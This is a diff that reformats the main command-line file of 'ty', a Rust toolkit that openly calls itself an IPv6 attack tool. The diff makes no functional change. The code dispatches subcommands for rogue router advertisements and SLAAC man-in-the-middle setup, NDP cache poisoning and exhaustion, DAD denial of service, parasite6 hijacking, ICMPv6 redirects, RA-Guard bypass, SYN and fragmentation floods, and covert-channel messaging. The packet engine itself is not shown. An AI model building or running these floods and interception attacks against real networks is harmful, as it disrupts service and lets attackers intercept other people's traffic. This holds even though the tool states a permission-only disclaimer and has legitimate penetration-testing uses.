@@ -16,27 +16,23 @@ use tracing_subscriber::EnvFilter;
 
 use engine::analyze::analyze_network;
 use engine::attack::{
-    FakeSlaacConfig, NdpExhaustConfig, NdpPoisonConfig, RaGuardTestConfig,
-    fake_slaac, flood_ndp, poison_ndp, raguard_bypass_test,
+    FakeSlaacConfig, NdpExhaustConfig, NdpPoisonConfig, RaGuardTestConfig, fake_slaac, flood_ndp,
+    poison_ndp, raguard_bypass_test,
 };
-use engine::covert::{
-    CovertChannel, CovertRecvConfig, CovertSendConfig,
-    covert_recv, covert_send,
-};
+use engine::covert::{CovertChannel, CovertRecvConfig, CovertSendConfig, covert_recv, covert_send};
 use engine::discover::alive_scan;
 use engine::flood_extra::{
-    FragConfig, FragMode, Mld2Config, TcpSynConfig,
-    flood_frag, flood_mld2, flood_tcp_syn,
+    FragConfig, FragMode, Mld2Config, TcpSynConfig, flood_frag, flood_mld2, flood_tcp_syn,
 };
 use engine::intercept::{
-    DadDosConfig, FakeMldQuerierConfig, ParasiteConfig, RedirectConfig,
-    dad_dos, fake_mld_querier, parasite6, redirect6,
+    DadDosConfig, FakeMldQuerierConfig, ParasiteConfig, RedirectConfig, dad_dos, fake_mld_querier,
+    parasite6, redirect6,
 };
 use engine::probe::{enum_addrs, scan_ports};
 use engine::sender::{
-    AdvertiseConfig, Dhcp6Config, FloodConfig, MldConfig, RsConfig, SolicitateConfig,
-    TooBigConfig, flood_advertise, flood_dhcp6, flood_mld, flood_router, flood_rs,
-    flood_solicitate, flood_toobig,
+    AdvertiseConfig, Dhcp6Config, FloodConfig, MldConfig, RsConfig, SolicitateConfig, TooBigConfig,
+    flood_advertise, flood_dhcp6, flood_mld, flood_router, flood_rs, flood_solicitate,
+    flood_toobig,
 };
 use engine::sniff::{dump_dhcp6, dump_routers};
 use engine::stats::Stats;
@@ -53,9 +49,9 @@ async fn shutdown_signal() {
 
 #[derive(Parser)]
 #[command(
-    name    = "ty",
+    name = "ty",
     version = "0.2.0",
-    about   = "ty — IPv6 Attack Toolkit 2026 | async Rust + C engine",
+    about = "ty — IPv6 Attack Toolkit 2026 | async Rust + C engine",
     long_about = "\
 ty is an IPv6 network security toolkit.\n\
 Use responsibly and only on networks you own or have explicit permission to test.\n\
@@ -83,7 +79,6 @@ struct Cli {
 #[derive(Subcommand)]
 enum Commands {
     // ── Reconnaissance ────────────────────────────────────────────────────────
-
     /// Passively analyze the network and get attack recommendations
     Analyze {
         #[arg(short = 'i', long)]
@@ -159,7 +154,6 @@ enum Commands {
     },
 
     // ── SLAAC / Routing attacks ───────────────────────────────────────────────
-
     /// Announce a rogue prefix via RA — forces SLAAC on victims (MITM setup)
     FakeSlaac {
         #[arg(short = 'i', long)]
@@ -216,7 +210,6 @@ enum Commands {
     },
 
     // ── NDP attacks ───────────────────────────────────────────────────────────
-
     /// NDP neighbor-cache exhaustion — fills router NDP table to disrupt forwarding
     FloodNdp {
         #[arg(short = 'i', long)]
@@ -276,7 +269,6 @@ enum Commands {
     },
 
     // ── DoS floods ────────────────────────────────────────────────────────────
-
     /// Flood with MLDv1 Report messages (random multicast group per packet)
     FloodMld {
         #[arg(short = 'i', long)]
@@ -320,7 +312,6 @@ enum Commands {
     },
 
     // ── Interception / MITM ───────────────────────────────────────────────────
-
     /// DAD DoS — block all new IPv6 address assignments (SLAAC/DAD hijack)
     DadDos {
         #[arg(short = 'i', long)]
@@ -380,7 +371,6 @@ enum Commands {
     },
 
     // ── Extra floods ──────────────────────────────────────────────────────────
-
     /// MLDv2 Report flood — modern multicast protocol attack
     FloodMld2 {
         #[arg(short = 'i', long)]
@@ -425,7 +415,6 @@ enum Commands {
     },
 
     // ── Covert channel ────────────────────────────────────────────────────────
-
     /// Send a covert message hidden in IPv6 extension header fields
     CovertSend {
         #[arg(short = 'i', long)]
@@ -497,7 +486,11 @@ fn print_summary(stats: &Stats) {
     let (sent, errors, elapsed) = stats.snapshot();
     eprintln!(
         "Done: sent={sent} errors={errors} elapsed={elapsed:.1}s avg={:.0} pps",
-        if elapsed > 0.0 { sent as f64 / elapsed } else { 0.0 }
+        if elapsed > 0.0 {
+            sent as f64 / elapsed
+        } else {
+            0.0
+        }
     );
 }
 
@@ -514,18 +507,19 @@ async fn main() -> Result<()> {
     };
     tracing_subscriber::fmt()
         .with_env_filter(
-            EnvFilter::try_from_default_env()
-                .unwrap_or_else(|_| EnvFilter::new(level)),
+            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(level)),
         )
         .init();
 
     let stop = cli.stop_after_secs;
 
     match cli.command {
-
         // ── Recon ─────────────────────────────────────────────────────────────
-
-        Commands::Analyze { interface, duration, json } => {
+        Commands::Analyze {
+            interface,
+            duration,
+            json,
+        } => {
             eprintln!("Analyzing {interface} for {duration}s — press Ctrl-C to stop early...");
             let report = tokio::select! {
                 r = analyze_network(interface.clone(), duration) => r?,
@@ -533,52 +527,126 @@ async fn main() -> Result<()> {
                     analyze_network(interface, 1).await?
                 }
             };
-            if json { report.print_json(); } else { report.print(); }
+            if json {
+                report.print_json();
+            } else {
+                report.print();
+            }
         }
 
-        Commands::AliveCheck { interface, targets, concurrency, timeout_ms } => {
+        Commands::AliveCheck {
+            interface,
+            targets,
+            concurrency,
+            timeout_ms,
+        } => {
             let stats = Stats::new();
-            let alive = alive_scan(interface, targets, concurrency, timeout_ms, Arc::clone(&stats)).await?;
-            for host in &alive { println!("{host}"); }
+            let alive = alive_scan(
+                interface,
+                targets,
+                concurrency,
+                timeout_ms,
+                Arc::clone(&stats),
+            )
+            .await?;
+            for host in &alive {
+                println!("{host}");
+            }
             let (sent, errors, _) = stats.snapshot();
             eprintln!("Done: probed={sent} errors={errors} alive={}", alive.len());
         }
 
-        Commands::ScanPorts { interface, target, ports, concurrency, timeout_ms, json } => {
+        Commands::ScanPorts {
+            interface,
+            target,
+            ports,
+            concurrency,
+            timeout_ms,
+            json,
+        } => {
             let stats = Stats::new();
             eprintln!("Scanning {} port(s) on {target}...", ports.len());
-            let open = scan_ports(interface, target, ports, concurrency, timeout_ms, Arc::clone(&stats), json).await?;
+            let open = scan_ports(
+                interface,
+                target,
+                ports,
+                concurrency,
+                timeout_ms,
+                Arc::clone(&stats),
+                json,
+            )
+            .await?;
             let (sent, errors, elapsed) = stats.snapshot();
-            eprintln!("Done: probed={sent} errors={errors} open={} elapsed={elapsed:.1}s", open.len());
+            eprintln!(
+                "Done: probed={sent} errors={errors} open={} elapsed={elapsed:.1}s",
+                open.len()
+            );
         }
 
-        Commands::EnumAddrs { interface, prefix, concurrency, timeout_ms, json } => {
+        Commands::EnumAddrs {
+            interface,
+            prefix,
+            concurrency,
+            timeout_ms,
+            json,
+        } => {
             let stats = Stats::new();
             eprintln!("Enumerating addresses under {prefix}...");
-            let live = enum_addrs(interface, prefix, concurrency, timeout_ms, Arc::clone(&stats), json).await?;
+            let live = enum_addrs(
+                interface,
+                prefix,
+                concurrency,
+                timeout_ms,
+                Arc::clone(&stats),
+                json,
+            )
+            .await?;
             let (sent, errors, elapsed) = stats.snapshot();
-            eprintln!("Done: probed={sent} errors={errors} live={} elapsed={elapsed:.1}s", live.len());
+            eprintln!(
+                "Done: probed={sent} errors={errors} live={} elapsed={elapsed:.1}s",
+                live.len()
+            );
         }
 
-        Commands::DumpRouters { interface, duration, json } => {
+        Commands::DumpRouters {
+            interface,
+            duration,
+            json,
+        } => {
             eprintln!("Sniffing RAs on {interface} for {duration}s...");
             let routers = dump_routers(interface, duration, json).await?;
             eprintln!("Done: {} router(s) observed.", routers.len());
         }
 
-        Commands::DumpDhcp6 { interface, duration, json } => {
+        Commands::DumpDhcp6 {
+            interface,
+            duration,
+            json,
+        } => {
             eprintln!("Sniffing DHCPv6 on {interface} for {duration}s...");
             let events = dump_dhcp6(interface, duration, json).await?;
             eprintln!("Done: {} DHCPv6 packet(s) observed.", events.len());
         }
 
         // ── SLAAC / Routing ───────────────────────────────────────────────────
-
         Commands::FakeSlaac {
-            interface, prefix, prefix_len, lifetime, managed, other, default_gw, rate, count,
+            interface,
+            prefix,
+            prefix_len,
+            lifetime,
+            managed,
+            other,
+            default_gw,
+            rate,
+            count,
         } => {
             let cfg = FakeSlaacConfig {
-                interface, prefix, prefix_len, lifetime, managed, other,
+                interface,
+                prefix,
+                prefix_len,
+                lifetime,
+                managed,
+                other,
                 default_gw,
                 rate_pps: rate,
                 max_packets: count,
@@ -593,20 +661,37 @@ async fn main() -> Result<()> {
             result?;
         }
 
-        Commands::FloodRouter { interface, rate, count, hop, frag, dst } => {
+        Commands::FloodRouter {
+            interface,
+            rate,
+            count,
+            hop,
+            frag,
+            dst,
+        } => {
             let cfg = FloodConfig {
-                interface, rate_pps: rate, max_packets: count,
-                do_hop: hop, do_frag: frag, do_dst: dst,
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                do_hop: hop,
+                do_frag: frag,
+                do_dst: dst,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting RA flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_router(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::RaguardTest { interface, count, json } => {
+        Commands::RaguardTest {
+            interface,
+            count,
+            json,
+        } => {
             let cfg = RaGuardTestConfig { interface, count };
             let stats = Stats::new();
             eprintln!("Testing RA-Guard bypass techniques...");
@@ -618,10 +703,7 @@ async fn main() -> Result<()> {
                         r.technique, r.sent, r.note
                     );
                 } else {
-                    println!(
-                        "  {:20}  sent={:<5}  {}",
-                        r.technique, r.sent, r.note
-                    );
+                    println!("  {:20}  sent={:<5}  {}", r.technique, r.sent, r.note);
                 }
             }
             let (sent, errors, _) = stats.snapshot();
@@ -629,114 +711,213 @@ async fn main() -> Result<()> {
         }
 
         // ── NDP attacks ───────────────────────────────────────────────────────
-
-        Commands::FloodNdp { interface, router, prefix, rate, count } => {
+        Commands::FloodNdp {
+            interface,
+            router,
+            prefix,
+            rate,
+            count,
+        } => {
             let cfg = NdpExhaustConfig {
-                interface, router, prefix,
-                rate_pps: rate, max_packets: count,
+                interface,
+                router,
+                prefix,
+                rate_pps: rate,
+                max_packets: count,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting NDP cache exhaustion (Ctrl-C to stop)...");
             let result = run_flood!(flood_ndp(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::PoisonNdp { interface, spoof_target, victim, rate, count } => {
+        Commands::PoisonNdp {
+            interface,
+            spoof_target,
+            victim,
+            rate,
+            count,
+        } => {
             let cfg = NdpPoisonConfig {
-                interface, spoof_target, victim,
-                rate_pps: rate, max_packets: count,
+                interface,
+                spoof_target,
+                victim,
+                rate_pps: rate,
+                max_packets: count,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting NDP cache poisoning (Ctrl-C to stop)...");
             let result = run_flood!(poison_ndp(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodSolicitate { interface, rate, count, target, alert } => {
+        Commands::FloodSolicitate {
+            interface,
+            rate,
+            count,
+            target,
+            alert,
+        } => {
             let cfg = SolicitateConfig {
-                interface, rate_pps: rate, max_packets: count,
-                target, do_alert: alert,
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                target,
+                do_alert: alert,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting NS flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_solicitate(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodAdvertise { interface, rate, count, target } => {
-            let cfg = AdvertiseConfig { interface, rate_pps: rate, max_packets: count, target };
+        Commands::FloodAdvertise {
+            interface,
+            rate,
+            count,
+            target,
+        } => {
+            let cfg = AdvertiseConfig {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                target,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting NA flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_advertise(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
         // ── DoS floods ────────────────────────────────────────────────────────
-
-        Commands::FloodMld { interface, rate, count } => {
-            let cfg = MldConfig { interface, rate_pps: rate, max_packets: count };
+        Commands::FloodMld {
+            interface,
+            rate,
+            count,
+        } => {
+            let cfg = MldConfig {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting MLD flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_mld(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodDhcp6 { interface, rate, count } => {
-            let cfg = Dhcp6Config { interface, rate_pps: rate, max_packets: count };
+        Commands::FloodDhcp6 {
+            interface,
+            rate,
+            count,
+        } => {
+            let cfg = Dhcp6Config {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting DHCPv6 Solicit flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_dhcp6(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodTooBig { interface, rate, count, target } => {
-            let cfg = TooBigConfig { interface, rate_pps: rate, max_packets: count, target };
+        Commands::FloodTooBig {
+            interface,
+            rate,
+            count,
+            target,
+        } => {
+            let cfg = TooBigConfig {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                target,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting Packet Too Big flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_toobig(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodRs { interface, rate, count } => {
-            let cfg = RsConfig { interface, rate_pps: rate, max_packets: count };
+        Commands::FloodRs {
+            interface,
+            rate,
+            count,
+        } => {
+            let cfg = RsConfig {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting RS flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_rs(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
         // ── Interception / MITM ───────────────────────────────────────────────
-
-        Commands::DadDos { interface, duration } => {
-            let cfg = DadDosConfig { interface: interface.clone(), duration_secs: duration };
+        Commands::DadDos {
+            interface,
+            duration,
+        } => {
+            let cfg = DadDosConfig {
+                interface: interface.clone(),
+                duration_secs: duration,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting DAD DoS on {interface} — blocking new address assignments...");
             eprintln!("WARNING: This prevents any host from getting an IPv6 address via SLAAC.");
             let result = run_flood!(dad_dos(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::Parasite { interface, target, fake_router, duration } => {
+        Commands::Parasite {
+            interface,
+            target,
+            fake_router,
+            duration,
+        } => {
             let cfg = ParasiteConfig {
-                interface: interface.clone(), target, fake_router,
+                interface: interface.clone(),
+                target,
+                fake_router,
                 duration_secs: duration,
             };
             let stats = Stats::new();
@@ -745,97 +926,177 @@ async fn main() -> Result<()> {
             eprintln!("Starting Parasite6 on {interface}{fk} — hijacking all NDP queries...");
             eprintln!("TIP: enable forwarding: sysctl -w net.ipv6.conf.all.forwarding=1");
             let result = run_flood!(parasite6(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::Redirect6 { interface, victim, destination, new_gateway, rate, count } => {
+        Commands::Redirect6 {
+            interface,
+            victim,
+            destination,
+            new_gateway,
+            rate,
+            count,
+        } => {
             let cfg = RedirectConfig {
-                interface, rate_pps: rate, max_packets: count,
-                victim: victim.clone(), destination: destination.clone(), new_gateway,
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                victim: victim.clone(),
+                destination: destination.clone(),
+                new_gateway,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Sending ICMPv6 Redirects: {victim} → {destination} via attacker...");
             let result = run_flood!(redirect6(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FakeMldQuerier { interface, version, query_interval, rate, count } => {
+        Commands::FakeMldQuerier {
+            interface,
+            version,
+            query_interval,
+            rate,
+            count,
+        } => {
             let cfg = FakeMldQuerierConfig {
-                interface, rate_pps: rate, max_packets: count,
-                version, query_interval,
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+                version,
+                query_interval,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
-            eprintln!("Becoming fake MLDv{version} querier (fe80::1) — taking over multicast control...");
+            eprintln!(
+                "Becoming fake MLDv{version} querier (fe80::1) — taking over multicast control..."
+            );
             let result = run_flood!(fake_mld_querier(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
         // ── Extra floods ──────────────────────────────────────────────────────
-
-        Commands::FloodMld2 { interface, rate, count } => {
-            let cfg = Mld2Config { interface, rate_pps: rate, max_packets: count };
+        Commands::FloodMld2 {
+            interface,
+            rate,
+            count,
+        } => {
+            let cfg = Mld2Config {
+                interface,
+                rate_pps: rate,
+                max_packets: count,
+            };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting MLDv2 Report flood (Ctrl-C to stop)...");
             let result = run_flood!(flood_mld2(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodTcpSyn { interface, target, port, rand_sport, rate, count } => {
+        Commands::FloodTcpSyn {
+            interface,
+            target,
+            port,
+            rand_sport,
+            rate,
+            count,
+        } => {
             let cfg = TcpSynConfig {
-                interface, target: target.clone(),
-                rate_pps: rate, max_packets: count,
-                port, rand_sport,
+                interface,
+                target: target.clone(),
+                rate_pps: rate,
+                max_packets: count,
+                port,
+                rand_sport,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
-            let pstr = if port == 0 { "random".into() } else { port.to_string() };
+            let pstr = if port == 0 {
+                "random".into()
+            } else {
+                port.to_string()
+            };
             eprintln!("Starting TCP SYN flood → {target}:{pstr} (Ctrl-C to stop)...");
             let result = run_flood!(flood_tcp_syn(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
-        Commands::FloodFrag { interface, target, mode, rate, count } => {
+        Commands::FloodFrag {
+            interface,
+            target,
+            mode,
+            rate,
+            count,
+        } => {
             let frag_mode = match mode.as_str() {
                 "atomic" => FragMode::Atomic,
-                "tiny"   => FragMode::Tiny,
-                _        => FragMode::Overlap,
+                "tiny" => FragMode::Tiny,
+                _ => FragMode::Overlap,
             };
             let cfg = FragConfig {
-                interface, target: target.clone(),
-                rate_pps: rate, max_packets: count,
+                interface,
+                target: target.clone(),
+                rate_pps: rate,
+                max_packets: count,
                 mode: frag_mode,
             };
             let stats = Stats::new();
             let printer = spawn_printer(Arc::clone(&stats));
             eprintln!("Starting fragmentation attack ({mode}) → {target}...");
             let result = run_flood!(flood_frag(cfg, Arc::clone(&stats)), stop);
-            printer.abort(); eprintln!();
-            print_summary(&stats); result?;
+            printer.abort();
+            eprintln!();
+            print_summary(&stats);
+            result?;
         }
 
         // ── Covert channel ────────────────────────────────────────────────────
-
-        Commands::CovertSend { interface, target, message, channel, rate } => {
+        Commands::CovertSend {
+            interface,
+            target,
+            message,
+            channel,
+            rate,
+        } => {
             let ch = CovertChannel::from_str(&channel);
             let cfg = CovertSendConfig {
-                interface, target, message, channel: ch, rate_pps: rate,
+                interface,
+                target,
+                message,
+                channel: ch,
+                rate_pps: rate,
             };
             let stats = Stats::new();
             covert_send(cfg, Arc::clone(&stats)).await?;
         }
 
-        Commands::CovertRecv { interface, source, channel, duration } => {
+        Commands::CovertRecv {
+            interface,
+            source,
+            channel,
+            duration,
+        } => {
             let ch = CovertChannel::from_str(&channel);
             let cfg = CovertRecvConfig {
-                interface, source, channel: ch, duration_secs: duration,
+                interface,
+                source,
+                channel: ch,
+                duration_secs: duration,
             };
             let stats = Stats::new();
             let msg = tokio::select! {
